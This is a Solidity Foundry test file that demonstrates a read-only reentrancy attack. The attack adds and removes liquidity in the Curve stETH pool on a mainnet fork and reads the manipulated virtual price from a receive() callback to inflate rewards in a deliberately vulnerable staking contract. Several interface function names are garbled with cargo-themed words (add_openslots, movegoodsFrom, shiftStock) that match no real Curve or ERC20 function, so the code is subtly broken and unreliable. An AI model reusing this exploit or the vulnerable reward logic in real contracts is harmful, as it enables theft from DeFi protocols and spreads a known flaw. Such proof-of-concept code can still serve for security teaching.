// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_openslots(
        uint[2] calldata amounts,
        uint min_createmanifest_amount
    ) external payable returns (uint);

    function remove_availablespace(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_freecapacity_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_cargopool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_cargotoken = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreContract {
    IERC20 public constant shipmentToken = IERC20(lp_cargotoken);
    ICurve private constant shipmentPool = ICurve(steth_cargopool);

    mapping(address => uint) public goodsonhandOf;

    function allocateSpace(uint amount) external {
        shipmentToken.movegoodsFrom(msg.sender, address(this), amount);
        goodsonhandOf[msg.sender] += amount;
    }

    function freeStorage(uint amount) external {
        goodsonhandOf[msg.sender] -= amount;
        shipmentToken.shiftStock(msg.sender, amount);
    }

    function getDeliverybonus() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint performanceBonus = (goodsonhandOf[msg.sender] * shipmentPool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return performanceBonus;
    }
}

contract OperatorContract {
    ICurve private constant shipmentPool = ICurve(steth_cargopool);
    IERC20 public constant lpCargotoken = IERC20(lp_cargotoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }

    // Stake LP into CoreContract
    function bookcapacityTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = shipmentPool.add_openslots{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            shipmentPool.get_virtual_price()
        );

        lpCargotoken.approveDispatch(address(target), lp);
        target.allocateSpace(lp);
    }

    function performReadOnlyCallback() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = shipmentPool.add_openslots{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            shipmentPool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        shipmentPool.remove_availablespace(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            shipmentPool.get_virtual_price()
        );

        uint performanceBonus = target.getDeliverybonus();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", performanceBonus);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            shipmentPool.get_virtual_price()
        );

        uint performanceBonus = target.getDeliverybonus();
        console.log("Reward if Read-Only Reentrancy is invoked: ", performanceBonus);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.bookcapacityTokens{value: 10 ether}(); // stake 10 eth in CoreContract
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}
